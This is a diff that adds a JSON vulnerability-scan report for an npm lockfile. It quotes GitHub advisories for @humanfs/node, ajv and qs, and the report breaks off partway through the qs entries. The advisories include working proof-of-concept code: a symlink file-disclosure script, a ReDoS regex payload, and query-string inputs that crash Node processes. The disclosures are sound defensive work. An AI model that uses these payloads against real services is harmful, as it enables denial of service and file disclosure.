@@ -1,0 +1,1682 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "C:/Users/jayan/OneDrive/Desktop/Software-Supply-Chain-Guardian_Team-31-main/Software-Supply-Chain-Guardian_Team-31-main/data/scans/OWASP__wrongsecrets__20261124-054904/repo/src/test/K8s-tests/package-lock.json",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "@humanfs/node",
+            "version": "0.16.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/%40humanfs/node@0.16.6?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-p498-v437-472g"
+              ],
+              "aliases": [
+                "GHSA-p498-v437-472g"
+              ],
+              "max_severity": "5.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-p498-v437-472g/GHSA-p498-v437-472g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@humanfs/node",
+                    "purl": "pkg:npm/%40humanfs/node"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.16.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:27:16Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`@humanfs/node` does not treat symlinks as a separate case during copy operations. A symlink placed inside an attacker-controlled source tree can make `copyAll()` read and copy the contents of any file readable by the process, even when that file is outside the directory being copied.\n\n### Details\n\nThe Node implementation exposes symlink state through `list()`, but `copyAll()` ignores it. During recursive copies, every non-directory entry is passed to `copy()`, which delegates to `fs.promises.copyFile()`.\n\nOn Node, `copyFile()` dereferences symlinks. As a result, a symlink inside the copied tree is handled as if it were an ordinary file, and the destination receives the contents of the symlink target rather than a copy of the link itself.\n\nThat breaks the expected boundary of a directory copy. A caller can point `copyAll()` at a seemingly self-contained directory and still end up copying data from elsewhere on the host filesystem if the source tree contains attacker-supplied symlinks.\n\nThe same dereference behavior also affects `copy()` when the source path itself is a symlink.\n\n### PoC\n\n```js\nimport { NodeHfs } from \"@humanfs/node\";\nimport fs from \"node:fs/promises\";\nimport path from \"node:path\";\nimport os from \"node:os\";\n\nconst root = await fs.mkdtemp(path.join(os.tmpdir(), \"humanfs-\"));\nconst src = path.join(root, \"src\");\nconst dst = path.join(root, \"dst\");\nconst secret = path.join(root, \"secret.txt\");\n\nawait fs.mkdir(src);\nawait fs.writeFile(secret, \"TOPSECRET\");\nawait fs.symlink(secret, path.join(src, \"link.txt\"));\n\nconst hfs = new NodeHfs();\nawait hfs.copyAll(src, dst);\n\nconsole.log(await fs.readFile(path.join(dst, \"link.txt\"), \"utf8\"));\n// TOPSECRET\n```\n\n### Impact\n\nIf an application uses `copyAll()` or `copy()` on attacker-controlled paths, a symlink can be used to pull arbitrary readable host files into the copied output. In practice, that can turn a normal workspace copy, export, or packaging step into a file disclosure primitive.",
+              "id": "GHSA-p498-v437-472g",
+              "modified": "2026-09-10T03:50:54.516902811Z",
+              "published": "2026-09-02T14:27:16Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/security/advisories/GHSA-p498-v437-472g"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/commit/22bbaa4487a3e6c1197ca619840de4615d0c3404"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/humanwhocodes/humanfs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/humanwhocodes/humanfs/releases/tag/node-v0.16.8"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "humanfs: Recursive copy follows symlinked files and copies data from outside the source tree"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "ajv",
+            "version": "6.12.6",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/ajv@6.12.6?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-2g4f-4pwh-qvx6"
+              ],
+              "aliases": [
+                "CVE-2025-69873",
+                "GHSA-2g4f-4pwh-qvx6"
+              ],
+              "max_severity": "5.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-2g4f-4pwh-qvx6/GHSA-2g4f-4pwh-qvx6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ajv",
+                    "purl": "pkg:npm/ajv"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "8.18.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-2g4f-4pwh-qvx6/GHSA-2g4f-4pwh-qvx6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "ajv",
+                    "purl": "pkg:npm/ajv"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "6.14.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-69873"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-02-17T16:38:57Z",
+                "nvd_published_at": "2026-02-11T19:15:50Z",
+                "severity": "MODERATE"
+              },
+              "details": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+              "id": "GHSA-2g4f-4pwh-qvx6",
+              "modified": "2026-09-10T03:50:33.716487588Z",
+              "published": "2026-02-11T21:30:39Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69873"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2586"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2588"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/pull/2590"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/github/advisory-database/pull/6991"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ajv-validator/ajv"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/releases/tag/v6.14.0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ajv-validator/ajv/releases/tag/v8.18.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "ajv has ReDoS when using `$data` option"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "qs",
+            "version": "6.15.2",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/qs@6.15.2?source=PUBLIC_REGISTRY"
+          },
+          "dependency_groups": [
+            "dev"
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "aliases": [
+                "CVE-2026-82417",
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "max_severity": "6.3"
+            },
+            {
+              "ids": [
+                "GHSA-6pq8-jhm2-2vcw"
+              ],
+              "aliases": [
+                "CVE-2026-110816",
+                "GHSA-6pq8-jhm2-2vcw"
+              ],
+              "max_severity": "6.3"
+            },
+            {
+              "ids": [
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "aliases": [
+                "CVE-2026-82562",
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-4mjr-xmp4-gh2g/GHSA-4mjr-xmp4-gh2g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.2.5"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82417"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248",
+                  "CWE-703"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:45:13Z",
+                "nvd_published_at": "2026-08-30T00:16:34Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\nnode poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+              "id": "GHSA-4mjr-xmp4-gh2g",
+              "modified": "2026-09-10T03:51:14.991984096Z",
+              "published": "2026-09-02T14:45:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82417"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs: Denial of Service via Attacker Controlled isBuffer"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.16.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-6pq8-jhm2-2vcw/GHSA-6pq8-jhm2-2vcw.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.7.0"
+                        },
+                        {
+                          "fixed": "6.16.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-110816"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248",
+                  "CWE-704"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-27T16:10:55Z",
+                "nvd_published_at": "2026-10-14T22:17:23Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length \u003e 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) =\u003e THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) =\u003e THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path =\u003e THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString =\u003e NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) =\u003e NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: \u003cnon-callable value\u003e } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: \u003e= 6.7.0, \u003c= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `\u003c= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n---\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `\u003e= 6.7.0, \u003c= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.\n\n### Impact\n\nOne small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.\n\n### Proof of Concept\n\n\u003cdetails\u003e\n\u003csummary\u003eShow the proof of concept\u003c/summary\u003e\n\nChecked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.\n\n- Payload `{\"a\":[{\"toString\":\"x\"}]}` throws at `lib/stringify.js:156`.\n- Baseline `{\"a\":[\"x\",\"y\"]}` returns 200 with body `a=x%2Cy`.\n- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.\n- `encodeValuesOnly: true` throws via `utils.js:292`.\n- `plainObjects` parse plus comma throws.\n\n\u003c/details\u003e\n\n### Suggested Fix\n\nBefore `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.",
+              "id": "GHSA-6pq8-jhm2-2vcw",
+              "modified": "2026-10-27T16:15:05.324423680Z",
+              "published": "2026-10-27T16:10:55Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-110816"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/releases/tag/v6.16.1"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.15.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-x5fp-wj9c-mxmx/GHSA-x5fp-wj9c-mxmx.json"
+                  },
+                  "package": {
